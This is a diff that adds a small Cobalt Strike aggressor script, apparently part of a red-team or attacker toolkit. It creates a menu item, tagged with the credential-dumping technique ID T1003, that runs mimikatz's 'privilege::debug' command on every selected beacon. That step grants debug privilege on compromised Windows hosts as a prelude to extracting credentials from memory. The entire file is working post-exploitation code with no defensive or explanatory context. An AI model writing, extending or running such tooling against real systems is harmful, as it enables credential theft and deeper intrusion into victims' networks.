@@ -1,0 +1,14 @@
+# Mimikatz Debug Privilege
+item "Mimikatz - Debug Privilege  - T1003"{
+
+	local('$bid');
+		foreach $bid ($1){
+			debug($bid);
+	}
+}
+
+
+#Mimikatz Debug Privilege
+sub debug{
+bmimikatz($1, "privilege::debug");
+}
